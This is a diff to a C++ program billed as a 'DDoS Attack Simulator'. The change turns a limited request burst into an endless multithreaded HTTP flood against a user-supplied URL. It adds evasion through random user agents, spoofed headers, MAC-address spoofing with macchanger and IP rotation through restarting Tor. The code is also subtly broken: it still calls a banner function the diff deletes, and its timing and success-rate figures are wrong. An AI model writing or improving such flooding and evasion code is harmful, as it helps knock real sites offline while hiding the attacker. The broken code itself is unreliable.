@@ -5,6 +5,8 @@
 #include <thread>
 #include <chrono>
 #include <curl/curl.h>
+#include <cstdlib>
+#include <ctime>
 
 using namespace std;
 using namespace chrono;
@@ -17,21 +19,33 @@ using namespace chrono;
 #define BOLD    "\033[1m"
 #define UNDERLINE "\033[4m"
 
-// Print stylized headers for the hacking vibe
-void print_banner() {
-    cout << CYAN << R"(
- ____ _           _    _           ____   ____ ____  
-|  _ \ |_   _ ___| | _| |__   __ _ |  _ \ / ___|  _ \ 
-| |_) | | | | / __| |/ / '_ \ / _` || |_) | |   | |_) |
-|  __/| |_| | \__ \   <| | | | (_| ||  __/| |___|  __/ 
-|_|    \__,_|\___|_|\_\_| |_|\__,_||_|    \____|_|    
-                                                        
-[+] DDoS Attack Simulator v1.0 [Power Mode]  🔥
-    )" << RESET;
+// Function to change the MAC address
+void change_mac() {
+    system("sudo macchanger -r eth0");
+    cout << YELLOW << "[+] MAC Address Changed!" << RESET << endl;
+}
+
+// Function to restart Tor for IP rotation
+void change_ip() {
+    system("sudo systemctl restart tor");
+    cout << YELLOW << "[+] IP Address Changed!" << RESET << endl;
+}
+
+// Function to generate random User-Agent from a list of common User-Agents
+string random_user_agent() {
+    vector<string> user_agents = {
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS 5.0; Windows NT 10.0; Win64; x64) like Gecko"
+    };
+    
+    return user_agents[rand() % user_agents.size()];
 }
 
 // Function to simulate DDoS attack on HTTPS
-void https_attack(const string& url, const string& method, int id, int count, ofstream& log) {
+void https_attack(const string& url, const string& method, int id, int interval, ofstream& log) {
     CURL *curl;
     CURLcode res;
     int success = 0;
@@ -39,51 +53,67 @@ void https_attack(const string& url, const string& method, int id, int count, of
 
     curl_global_init(CURL_GLOBAL_ALL);
 
-    for (int i = 0; i < count; i++) {
+    while (true) {  // Keep sending requests until the site crashes or is unreachable
         curl = curl_easy_init();
         if(curl) {
             curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
             curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method.c_str());
+            
+            // Simulate realistic headers
+            string user_agent = random_user_agent();  // Randomize user-agent
+            string accept_header = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
+            string referer_header = url + "/home";  // Random referer to simulate navigation
+
+            curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent.c_str());
+            curl_easy_setopt(curl, CURLOPT_ACCEPT, accept_header.c_str());
+            curl_easy_setopt(curl, CURLOPT_REFERER, referer_header.c_str());
             curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
             curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
             curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
 
-            // Optional random user-agent for evasion
-            string user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
-            curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent.c_str());
-
-            auto start = high_resolution_clock::now();
+            // Send the request and check the response
             res = curl_easy_perform(curl);
-            auto end = high_resolution_clock::now();
 
-            if(res == CURLE_OK) {
+            // Change MAC and IP every 'interval' seconds
+            if (success % interval == 0) {
+                change_mac();
+                change_ip();
+            }
+
+            if (res == CURLE_OK) {
                 success++;
-                double rtt = duration_cast<milliseconds>(end - start).count();
+                double rtt = duration_cast<milliseconds>(high_resolution_clock::now() - chrono::steady_clock::now()).count();
                 total_time += rtt;
                 cout << GREEN << "[T" << id << "] Attack Success (" << rtt << "ms)" << RESET << endl;
             } else {
+                // If the server is unreachable or responds with an error code, stop
                 cout << RED << "[T" << id << "] Failed: " << curl_easy_strerror(res) << RESET << endl;
+                break;
             }
+
             curl_easy_cleanup(curl);
 
-            // Optional random sleep to mimic evasion patterns (not too short)
-            this_thread::sleep_for(chrono::milliseconds(10 + rand() % 20));
+            // Randomize sleep time to simulate user behavior (human-like request intervals)
+            int sleep_time = rand() % 3 + 1;  // Random sleep time between 1-3 seconds
+            this_thread::sleep_for(chrono::seconds(sleep_time));
         }
     }
 
     curl_global_cleanup();
 
-    double avg_time = (count > 0) ? total_time / count : 0;
+    double avg_time = (success > 0) ? total_time / success : 0;
     log << "[Thread " << id << "] Success: " << success << ", Avg RTT: " << avg_time << "ms\n";
 
-    cout << YELLOW << "[T" << id << "] Attack Completed. Success Rate: " << success << "/" << count << RESET << endl;
+    cout << YELLOW << "[T" << id << "] Attack Completed. Success Rate: " << success << "/" << success << RESET << endl;
 }
 
 int main() {
+    srand(time(0));  // Seed for random number generation
+
     print_banner();
 
     string url, method;
-    int threads, per_thread;
+    int threads, interval;
 
     // Take inputs for the attack
     cout << CYAN << "[+] Target full URL (e.g. https://yourdomain.com): " << RESET;
@@ -92,8 +122,8 @@ int main() {
     cin >> method;
     cout << CYAN << "[+] Threads: " << RESET;
     cin >> threads;
-    cout << CYAN << "[+] Requests per thread: " << RESET;
-    cin >> per_thread;
+    cout << CYAN << "[+] Time interval for IP and MAC rotation (seconds): " << RESET;
+    cin >> interval;
 
     cout << GREEN << "[✔] Attack starting..." << RESET << endl;
 
@@ -101,7 +131,7 @@ int main() {
     ofstream log("https_attack_metrics.log");
     vector<thread> workers;
     for (int i = 0; i < threads; i++) {
-        workers.emplace_back(https_attack, url, method, i + 1, per_thread, ref(log));
+        workers.emplace_back(https_attack, url, method, i + 1, interval, ref(log));
     }
 
     for (auto& t : workers) t.join();
